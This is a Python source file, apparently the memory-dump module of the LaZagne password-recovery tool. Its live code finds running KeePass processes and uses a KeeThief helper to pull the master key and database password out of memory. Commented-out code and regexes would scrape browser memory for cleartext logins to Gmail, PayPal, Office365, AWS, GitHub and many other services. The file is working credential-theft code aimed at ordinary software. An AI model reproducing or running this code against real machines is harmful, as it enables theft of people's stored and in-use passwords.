#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# Author: Nicolas VERDIER (contact@n1nj4.eu)

""" 
This script uses memorpy to dumps cleartext passwords from browser's memory
It has been tested on both windows 10 and ubuntu 16.04
The regex have been taken from the mimikittenz https://github.com/putterpanda/mimikittenz
"""

from .keethief import KeeThief
from lazagne.config.module_info import ModuleInfo
from lazagne.config.constant import constant
from lazagne.config.winstructure import get_full_path_from_pid
from lazagne.config.lib.memorpy import *


# Memorpy has been removed because it takes to much time to execute - could return one day

# create a symbolic link on Windows
# mklink /J memorpy ..\..\..\..\external\memorpy\memorpy

# password_regex=[
#     "(email|log(in)?|user(name)?)=(?P<Login>.{1,25})?&.{0,10}?p[a]?[s]?[s]?[w]?[o]?[r]?[d]?=(?P<Password>.{1,25})&"
# ]

# grep to list all URLs (could be useful to find the relation between a user / password and its host)
# http_regex=[
#     "(?P<URL>http[s]?:\/\/[a-zA-Z0-9-]{1,61}(\.[a-zA-Z]{2,})+)"
# ]

# password_regex=[
# 	("Gmail","&Email=(?P<Login>.{1,99})?&Passwd=(?P<Password>.{1,99})?&PersistentCookie="),
# 	("Dropbox","login_email=(?P<Login>.{1,99})&login_password=(?P<Password>.{1,99})&"),
# 	("SalesForce","&display=page&username=(?P<Login>.{1,32})&pw=(?P<Password>.{1,16})&Login="),
# 	("Office365","login=(?P<Login>.{1,32})&passwd=(?P<Password>.{1,22})&PPSX="),
# 	("MicrosoftOneDrive","login=(?P<Login>.{1,42})&passwd=(?P<Password>.{1,22})&type=.{1,2}&PPFT="),
# 	("PayPal","login_email=(?P<Login>.{1,48})&login_password=(?P<Password>.{1,16})&submit=Log\+In&browser_name"),
# 	("awsWebServices","&email=(?P<Login>.{1,48})&create=.{1,2}&password=(?P<Password>.{1,22})&metadata1="),
# 	("OutlookWeb","&username=(?P<Login>.{1,48})&password=(?P<Password>.{1,48})&passwordText"),
# 	("Slack","&crumb=.{1,70}&email=(?P<Login>.{1,50})&password=(?P<Password>.{1,48})"),
# 	("CitrixOnline","emailAddress=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})&submit"),
# 	("Xero ","fragment=&userName=(?P<Login>.{1,32})&password=(?P<Password>.{1,22})&__RequestVerificationToken="),
# 	("MYOB","UserName=(?P<Login>.{1,50})&Password=(?P<Password>.{1,50})&RememberMe="),
# 	("JuniperSSLVPN","tz_offset=-.{1,6}&username=(?P<Login>.{1,22})&password=(?P<Password>.{1,22})&realm=.{1,22}&btnSubmit="),
# 	("Twitter","username_or_email%5D=(?P<Login>.{1,42})&session%5Bpassword%5D=(?P<Password>.{1,22})&remember_me="),
# 	("Facebook","lsd=.{1,10}&email=(?P<Login>.{1,42})&pass=(?P<Password>.{1,22})&(?:default_)?persistent="),
# 	("LinkedIN","session_key=(?P<Login>.{1,50})&session_password=(?P<Password>.{1,50})&isJsEnabled"),
# 	("Malwr","&username=(?P<Login>.{1,32})&password=(?P<Password>.{1,22})&next="),
# 	("VirusTotal","password=(?P<Password>.{1,22})&username=(?P<Login>.{1,42})&next=%2Fen%2F&response_format=json"),
# 	("AnubisLabs","username=(?P<Login>.{1,42})&password=(?P<Password>.{1,22})&login=login"),
# 	("CitrixNetScaler","login=(?P<Login>.{1,22})&passwd=(?P<Password>.{1,42})"),
# 	("RDPWeb","DomainUserName=(?P<Login>.{1,52})&UserPass=(?P<Password>.{1,42})&MachineType"),
# 	("JIRA","username=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})&rememberMe"),
# 	("Redmine","username=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})&login=Login"),
# 	("Github","%3D%3D&login=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})"),
# 	("BugZilla","Bugzilla_login=(?P<Login>.{1,50})&Bugzilla_password=(?P<Password>.{1,50})"),
# 	("Zendesk","user%5Bemail%5D=(?P<Login>.{1,50})&user%5Bpassword%5D=(?P<Password>.{1,50})"),
# 	("Cpanel","user=(?P<Login>.{1,50})&pass=(?P<Password>.{1,50})"),
# ]

browser_list = ["iexplore.exe", "firefox.exe", "chrome.exe", "opera.exe", "MicrosoftEdge.exe", "microsoftedgecp.exe"]
keepass_process = 'keepass.exe'


class MemoryDump(ModuleInfo):
    def __init__(self):
        options = {'command': '-m', 'action': 'store_true', 'dest': 'memory_dump',
                   'help': 'retrieve browsers passwords from memory'}
        ModuleInfo.__init__(self, 'memory_dump', 'memory', options)

    def run(self):
        pwd_found = []
        for process in Process.list():
            # if not memorpy:
            #     if process.get('name', '').lower() in browser_list:
            #         # Get only child process
            #         try:
            #             p = psutil.Process(process.get('pid'))
            #             if p.parent():
            #                 if process.get('name', '').lower() != str(p.parent().name().lower()):
            #                     continue
            #         except:
            #             continue
            #
            #         try:
            #             mw = MemWorker(pid=process.get('pid'))
            #         except ProcessException:
            #             continue
            #
            #         self.debug(u'dumping passwords from %s (pid: %s) ...' % (process.get('name', ''),
            #                                                                  str(process.get('pid', ''))))
            #         for _, x in mw.mem_search(password_regex, ftype='groups'):
            #             login, password = x[-2:]
            #             pwd_found.append(
            #                 {
            #                     'URL'		:	'Unknown',
            #                     'Login'		: 	login,
            #                     'Password'	: 	password
            #                 }
            #             )

            if keepass_process in process.get('name', '').lower():
                full_exe_path = get_full_path_from_pid(process.get('pid'))
                k = KeeThief()
                if k.run(full_exe_path=full_exe_path):
                    for keepass in constant.keepass:
                        data = keepass.get('KcpPassword', None)
                        if data: 
                            pwd_found.append({
                                'Category': 'KeePass',
                                'KeyType': data['KeyType'],
                                'Login': data['Database'],
                                'Password': data['Password']
                            })

        return pwd_found
